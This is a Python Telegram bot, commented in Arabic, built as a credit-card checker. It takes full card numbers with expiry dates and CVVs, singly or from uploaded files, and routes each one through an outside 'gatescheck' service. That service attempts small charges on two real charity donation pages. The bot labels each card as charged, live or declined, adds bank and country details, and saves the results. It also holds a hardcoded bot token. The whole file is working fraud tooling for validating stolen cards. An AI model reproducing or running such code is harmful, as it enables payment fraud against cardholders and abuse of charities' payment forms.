import os
import re
import time
import asyncio
import httpx
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

TOKEN = '8610138136:AAHHtP1A21F3NdW6hcQHocpgkcd-GF2EE_U'

# البوابات للتبديل التلقائي
GATES = [
    "https://raybensch.com/donations/support-ray/",
    "https://www.wfft.org/donations/general-donation/"
]
gate_index = 0
stop_users = {}

# تسريع الفحص
api_semaphore = asyncio.Semaphore(6)

# ------------------- BIN Lookup -------------------
async def get_bin_info(bin_number):
    try:
        async with httpx.AsyncClient(timeout=10) as client:
            r = await client.get(f"https://lookup.binlist.net/{bin_number}")
            data = r.json()
            brand = data.get("scheme", "N/A")
            card_type = data.get("type", "N/A")
            bank = data.get("bank", {}).get("name", "N/A")
            country = data.get("country", {}).get("name", "N/A")
            return f"{brand} - {card_type}", bank, country
    except:
        return "N/A", "N/A", "N/A"

# ------------------- Check API -------------------
async def check_card_api(card_full):
    global gate_index
    gate = GATES[gate_index]
    gate_index = (gate_index + 1) % len(GATES)

    params = {
        "url": gate,
        "card": card_full,
        "amount": 0.50
    }

    async with api_semaphore:
        try:
            async with httpx.AsyncClient(timeout=20) as client:
                r = await client.get("http://gatescheck.duckdns.org:7000/check", params=params)

            result_raw = r.json().get('result', '')
            result = result_raw.lower()

            if "charge" in result or "success" in result:
                return "approved", result_raw
            elif "insufficient" in result:
                return "live", result_raw
            else:
                return "declined", result_raw

        except:
            return "declined", "Error"

# ------------------- Format Response -------------------
async def format_response(card_full, status, response, taken):
    bin_number = card_full.split("|")[0][:6]
    info, bank, country = await get_bin_info(bin_number)

    if status == "approved":
        title = "#Charge ✅"
    elif status == "live":
        title = "#Live 🟢"
    else:
        title = "#Declined ❌"

    return f"""{title}

💳 Card: {card_full}
📨 Response: {response}

🏦 Info: {info}
🏛 Bank: {bank}
🌍 Country: {country}

⏱ Time: {taken}s
"""

# ------------------- /pp -------------------
async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    asyncio.create_task(process_pp(update, context))

async def process_pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    card_full = " ".join(context.args)
    if not card_full:
        await update.message.reply_text("Usage:\n/pp 4242424242424242|09|28|123")
        return

    start_time = time.time()
    status, response = await check_card_api(card_full)
    taken = round(time.time() - start_time, 2)

    text = await format_response(card_full, status, response, taken)
    await update.message.reply_text(text)

# ------------------- /stop -------------------
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stop_users[update.effective_user.id] = True
    await update.message.reply_text("Stopped ⛔")

# ------------------- File Handler -------------------
async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    asyncio.create_task(process_file(update, context))

async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stop_users[user_id] = False

    os.makedirs("downloads", exist_ok=True)
    file = await update.message.document.get_file()
    file_path = f"downloads/{file.file_id}.txt"
    await file.download_to_drive(file_path)

    results_file_path = f"downloads/results_{file.file_id}.txt"

    approved = live = declined = 0
    panel_msg = await update.message.reply_text("Start Checking... 🔍")

    with open(file_path, 'r', encoding='utf-8') as f:
        lines = f.readlines()

    with open(results_file_path, 'w', encoding='utf-8') as result_file:
        for i, line in enumerate(lines):
            if stop_users.get(user_id):
                await update.message.reply_text("Stopped ⛔")
                return

            match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
            if not match:
                continue

            card_full = match[0]
            start_time = time.time()
            status, response = await check_card_api(card_full)
            taken = round(time.time() - start_time, 2)

            if status == "approved":
                approved += 1
            elif status == "live":
                live += 1
            else:
                declined += 1

            # ارسال التفاصيل للتليجرام
            text = await format_response(card_full, status, response, taken)
            await update.message.reply_text(text)

            # حفظ نفس التنسيق في ملف النتائج
            result_file.write(text + "\n\n")

            # تحديث البانل كل 5 كروت
            if i % 5 == 0:
                last_info, last_bank, last_country = await get_bin_info(card_full.split("|")[0][:6])
                panel = f"""📊 Status

✅ Charge: {approved}
🟢 Live: {live}
❌ Declined: {declined}
📂 Total: {approved + live + declined}

━━━━━━━━━━━━━━━
💳 Last Card: {card_full}
📨 Response: {response}
🏦 Info: {last_info}
🏛 Bank: {last_bank}
🌍 Country: {last_country}
📌 Status: {status}
━━━━━━━━━━━━━━━

⛔ Stop: {'ON' if stop_users.get(user_id) else 'OFF'}
"""
                try:
                    await panel_msg.edit_text(panel)
                except:
                    pass

            await asyncio.sleep(0.2)

    await update.message.reply_text(f"Done ✅\nResults saved: {results_file_path}")

# ------------------- /start -------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Bot Ready ✅")

# ------------------- Run -------------------
def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("pp", pp))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.run_polling()

if __name__ == "__main__":
    main()
